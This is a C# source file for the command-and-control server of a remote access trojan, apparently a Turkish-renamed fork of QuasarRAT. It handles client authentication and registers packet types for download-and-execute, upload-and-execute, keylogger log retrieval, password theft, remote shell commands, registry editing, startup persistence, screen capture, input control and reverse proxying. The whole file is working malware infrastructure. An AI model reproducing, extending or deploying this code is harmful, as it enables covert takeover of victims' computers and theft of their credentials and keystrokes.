using System;
using System.Linq;
using xServer.KuuhakuCekirdek.Eylemler;
using xServer.KuuhakuCekirdek.NetSerializer;
using xServer.KuuhakuCekirdek.Paketler;

namespace xServer.KuuhakuCekirdek.Ağ
{
    public class KuuhakuServer : Server
    {
        public Client[] ConnectedClients
        {
            get { return Clients.Where(c => c != null && c.Authenticated).ToArray(); }
        }

        public event ClientConnectedEventHandler ClientConnected;
        public delegate void ClientConnectedEventHandler(Client client);

        private void OnClientConnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientConnected;
            if (handler != null)
            {
                handler(client);
            }
        }

        public event ClientDisconnectedEventHandler ClientDisconnected;

        public delegate void ClientDisconnectedEventHandler(Client client);

        private void OnClientDisconnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientDisconnected;
            if (handler != null)
            {
                handler(client);
            }
        }

        public KuuhakuServer()
            : base()
        {
            base.Serializer = new Serializer(new Type[]
            {
                typeof (Paketler.ServerPaketleri.GetAuthentication),
                typeof (Paketler.ServerPaketleri.DoClientDisconnect),
                typeof (Paketler.ServerPaketleri.DoClientReconnect),
                typeof (Paketler.ServerPaketleri.DoClientUninstall),
                typeof (Paketler.ServerPaketleri.DoDownloadAndExecute),
                typeof (Paketler.ServerPaketleri.DoUploadAndExecute),
                typeof (Paketler.ServerPaketleri.GetDesktop),
                typeof (Paketler.ServerPaketleri.GetProcesses),
                typeof (Paketler.ServerPaketleri.DoProcessKill),
                typeof (Paketler.ServerPaketleri.DoProcessStart),
                typeof (Paketler.ServerPaketleri.GetDrives),
                typeof (Paketler.ServerPaketleri.GetDirectory),
                typeof (Paketler.ServerPaketleri.DoDownloadFile),
                typeof (Paketler.ServerPaketleri.DoMouseEvent),
                typeof (Paketler.ServerPaketleri.DoKeyboardEvent),
                typeof (Paketler.ServerPaketleri.GetSystemInfo),
                typeof (Paketler.ServerPaketleri.DoVisitWebsite),
                typeof (Paketler.ServerPaketleri.DoShowMessageBox),
                typeof (Paketler.ServerPaketleri.DoClientUpdate),
                typeof (Paketler.ServerPaketleri.GetMonitors),
                typeof (Paketler.ServerPaketleri.DoShellExecute),
                typeof (Paketler.ServerPaketleri.DoPathRename),
                typeof (Paketler.ServerPaketleri.DoPathDelete),
                typeof (Paketler.ServerPaketleri.DoShutdownAction),
                typeof (Paketler.ServerPaketleri.GetStartupItems),
                typeof (Paketler.ServerPaketleri.DoStartupItemAdd),
                typeof (Paketler.ServerPaketleri.DoStartupItemRemove),
                typeof (Paketler.ServerPaketleri.DoDownloadFileCancel),
                typeof (Paketler.ServerPaketleri.GetKeyloggerLogs),
                typeof (Paketler.ServerPaketleri.DoUploadFile),
                typeof (Paketler.ServerPaketleri.GetPasswords),
                typeof (Paketler.ServerPaketleri.DoLoadRegistryKey),
                typeof (Paketler.ServerPaketleri.DoCreateRegistryKey),
                typeof (Paketler.ServerPaketleri.DoDeleteRegistryKey),
                typeof (Paketler.ServerPaketleri.DoRenameRegistryKey),
                typeof (Paketler.ServerPaketleri.DoCreateRegistryValue),
                typeof (Paketler.ServerPaketleri.DoDeleteRegistryValue),
                typeof (Paketler.ServerPaketleri.DoRenameRegistryValue),
                typeof (Paketler.ServerPaketleri.DoChangeRegistryValue),
                typeof (Paketler.ServerPaketleri.SetAuthenticationSuccess),
                typeof (Paketler.ClientPaketleri.GetAuthenticationResponse),
                typeof (Paketler.ClientPaketleri.SetStatus),
                typeof (Paketler.ClientPaketleri.SetStatusFileManager),
                typeof (Paketler.ClientPaketleri.SetUserStatus),
                typeof (Paketler.ClientPaketleri.GetDesktopResponse),
                typeof (Paketler.ClientPaketleri.GetProcessesResponse),
                typeof (Paketler.ClientPaketleri.GetDrivesResponse),
                typeof (Paketler.ClientPaketleri.GetDirectoryResponse),
                typeof (Paketler.ClientPaketleri.DoDownloadFileResponse),
                typeof (Paketler.ClientPaketleri.GetSystemInfoResponse),
                typeof (Paketler.ClientPaketleri.GetMonitorsResponse),
                typeof (Paketler.ClientPaketleri.DoShellExecuteResponse),
                typeof (Paketler.ClientPaketleri.GetStartupItemsResponse),
                typeof (Paketler.ClientPaketleri.GetKeyloggerLogsResponse),
                typeof (Paketler.ClientPaketleri.GetPasswordsResponse),
                typeof (Paketler.ClientPaketleri.GetRegistryKeysResponse),
                typeof (Paketler.ClientPaketleri.GetCreateRegistryKeyResponse),
                typeof (Paketler.ClientPaketleri.GetDeleteRegistryKeyResponse),
                typeof (Paketler.ClientPaketleri.GetRenameRegistryKeyResponse),
                typeof (Paketler.ClientPaketleri.GetCreateRegistryValueResponse),
                typeof (Paketler.ClientPaketleri.GetDeleteRegistryValueResponse),
                typeof (Paketler.ClientPaketleri.GetRenameRegistryValueResponse),
                typeof (Paketler.ClientPaketleri.GetChangeRegistryValueResponse),
                typeof (ReverseProxy.Packets.ReverseProxyConnect),
                typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (ReverseProxy.Packets.ReverseProxyData),
                typeof (ReverseProxy.Packets.ReverseProxyDisconnect)
            });

            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
        }

        private void OnClientState(Server server, Client client, bool connected)
        {
            switch (connected)
            {
                case true:
                    new Paketler.ServerPaketleri.GetAuthentication().Execute(client); // begin handshake
                    break;
                case false:
                    if (client.Authenticated)
                    {
                        OnClientDisconnected(client);
                    }
                    break;
            }
        }

        private void OnClientRead(Server server, Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!client.Authenticated)
            {
                if (type == typeof(Paketler.ClientPaketleri.GetAuthenticationResponse))
                {
                    client.Authenticated = true;
                    new Paketler.ServerPaketleri.SetAuthenticationSuccess().Execute(client); // finish handshake
                    Eylemİşleyicisi.HandleGetAuthenticationResponse(client,
                        (Paketler.ClientPaketleri.GetAuthenticationResponse)packet);
                    OnClientConnected(client);
                }
                else
                {
                    client.Disconnect();
                }
                return;
            }

            Packetİşleyicisi.HandlePacket(client, packet);
        }
    }
}